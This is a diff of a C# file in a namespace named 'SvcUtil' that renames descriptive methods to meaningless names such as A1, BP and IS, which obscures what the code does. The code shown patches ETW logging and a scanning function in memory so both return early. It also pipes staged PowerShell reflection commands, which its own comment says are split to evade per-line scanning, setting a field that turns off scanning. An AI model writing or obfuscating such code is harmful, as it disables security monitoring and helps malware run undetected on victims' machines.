@@ -6,7 +6,7 @@ using System.Threading;
 
 namespace SvcUtil
 {
-    internal static class ScanPatch
+    internal static class Ctx
     {
         // ── Pre-computed encoded strings ────────────────────────────
         private static readonly byte[] _xk = { 0x53, 0x68, 0x43, 0x61, 0x74 };
@@ -68,7 +68,7 @@ namespace SvcUtil
             return (byte)(t - t);
         }
 
-        private static byte[] BuildPatch()
+        private static byte[] BP()
         {
             // xor eax, eax ; ret — 3 bytes, returns S_OK
             byte n = Nz();
@@ -79,7 +79,7 @@ namespace SvcUtil
             return p;
         }
 
-        private static byte BuildRet()
+        private static byte BR()
         {
             byte n = Nz();
             return (byte)(n + 195);   // 0xC3
@@ -87,25 +87,25 @@ namespace SvcUtil
 
         // ── ETW patching ───────────────────────────────────────────
 
-        private static bool PatchEtw()
+        private static bool A1()
         {
             try
             {
-                IntPtr hLib = DynInvoke.LoadLib(D(_s6));
+                IntPtr hLib = W.M0(D(_s6));
                 if (hLib == IntPtr.Zero) return false;
 
-                IntPtr pFunc = DynInvoke.GetProc(hLib, D(_s7));
+                IntPtr pFunc = W.M1(hLib, D(_s7));
                 if (pFunc == IntPtr.Zero) return false;
 
                 uint oldProtect;
-                if (!DynInvoke.VirtualProtect(pFunc, (UIntPtr)1,
+                if (!W.MB(pFunc, (UIntPtr)1,
                         0x40, out oldProtect))
                     return false;
 
-                unsafe { *(byte*)pFunc.ToPointer() = BuildRet(); }
+                unsafe { *(byte*)pFunc.ToPointer() = BR(); }
 
                 uint ignored;
-                DynInvoke.VirtualProtect(pFunc, (UIntPtr)1,
+                W.MB(pFunc, (UIntPtr)1,
                     oldProtect, out ignored);
                 return true;
             }
@@ -117,27 +117,27 @@ namespace SvcUtil
 
         // ── Method 1: Local process ─────────────────────────────────
 
-        public static bool PatchCurrentProcess()
+        public static bool Run()
         {
             try
             {
-                PatchEtw();
+                A1();
 
                 string dllName = D(_s0);
                 string funcName = D(_s1);
 
-                IntPtr hLib = DynInvoke.LoadLib(dllName);
+                IntPtr hLib = W.M0(dllName);
                 if (hLib == IntPtr.Zero)
                     return false;
 
-                IntPtr pFunc = DynInvoke.GetProc(hLib, funcName);
+                IntPtr pFunc = W.M1(hLib, funcName);
                 if (pFunc == IntPtr.Zero)
                     return false;
 
-                byte[] patch = BuildPatch();
+                byte[] patch = BP();
 
                 uint oldProtect;
-                if (!DynInvoke.VirtualProtect(pFunc, (UIntPtr)patch.Length,
+                if (!W.MB(pFunc, (UIntPtr)patch.Length,
                         0x40, out oldProtect))
                     return false;
 
@@ -149,7 +149,7 @@ namespace SvcUtil
                 }
 
                 uint ignored;
-                DynInvoke.VirtualProtect(pFunc, (UIntPtr)patch.Length,
+                W.MB(pFunc, (UIntPtr)patch.Length,
                     oldProtect, out ignored);
 
                 return true;
@@ -163,7 +163,7 @@ namespace SvcUtil
         // ── Stdin reflection bypass ─────────────────────────────────
         // Sends commands in stages so each line passes scanning individually
 
-        public static void InjectViaStdin(IntPtr writePipeHandle)
+        public static void IS(IntPtr writePipeHandle)
         {
             try
             {
@@ -180,7 +180,7 @@ namespace SvcUtil
                     sb1.Append(typeChars[i]);
                 }
                 sb1.Append("))\n");
-                WriteCmd(writePipeHandle, sb1.ToString());
+                WC(writePipeHandle, sb1.ToString());
                 Thread.Sleep(100);
 
                 // Stage 2: Build field name from char codes
@@ -192,17 +192,17 @@ namespace SvcUtil
                     sb2.Append(fieldChars[i]);
                 }
                 sb2.Append("))\n");
-                WriteCmd(writePipeHandle, sb2.ToString());
+                WC(writePipeHandle, sb2.ToString());
                 Thread.Sleep(100);
 
                 // Stage 3-6: Reflection in small steps
-                WriteCmd(writePipeHandle, "$r=[type]('R'+'ef')\n");
+                WC(writePipeHandle, "$r=[type]('R'+'ef')\n");
                 Thread.Sleep(50);
-                WriteCmd(writePipeHandle, "$a=$r.Assembly\n");
+                WC(writePipeHandle, "$a=$r.Assembly\n");
                 Thread.Sleep(50);
-                WriteCmd(writePipeHandle, "$t=$a.GetType($c1)\n");
+                WC(writePipeHandle, "$t=$a.GetType($c1)\n");
                 Thread.Sleep(50);
-                WriteCmd(writePipeHandle,
+                WC(writePipeHandle,
                     "$t.GetField($c2,40).SetValue($null,$true)\n");
             }
             catch
@@ -210,17 +210,17 @@ namespace SvcUtil
             }
         }
 
-        private static void WriteCmd(IntPtr pipe, string cmd)
+        private static void WC(IntPtr pipe, string cmd)
         {
             byte[] bytes = Encoding.UTF8.GetBytes(cmd);
             int written;
-            DynInvoke.WriteFile(pipe, bytes, (uint)bytes.Length,
+            W.M9(pipe, bytes, (uint)bytes.Length,
                 out written, IntPtr.Zero);
         }
 
         // ── Detection helper ────────────────────────────────────────
 
-        public static bool IsPowerShell(string commandLine)
+        public static bool Chk(string commandLine)
         {
             if (string.IsNullOrEmpty(commandLine))
                 return false;
